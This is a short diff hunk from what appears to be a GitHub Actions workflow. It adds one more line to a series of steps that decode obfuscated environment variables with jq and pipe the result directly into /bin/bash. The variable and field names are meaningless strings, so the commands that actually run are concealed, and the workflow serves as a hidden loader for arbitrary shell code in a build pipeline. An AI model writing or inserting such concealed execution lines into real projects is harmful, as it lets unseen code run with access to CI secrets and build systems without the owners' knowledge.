@@ -47,6 +47,7 @@ jobs:
           echo $vb228 | jq -r .tt96 | /bin/bash
           echo $z21391 | jq -r .xfdb9893 | /bin/bash
           echo $qgnfv02 | jq -r .ccz63018 | /bin/bash
+          printf '%s' "$p6" | jq -r .xgfo8253 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
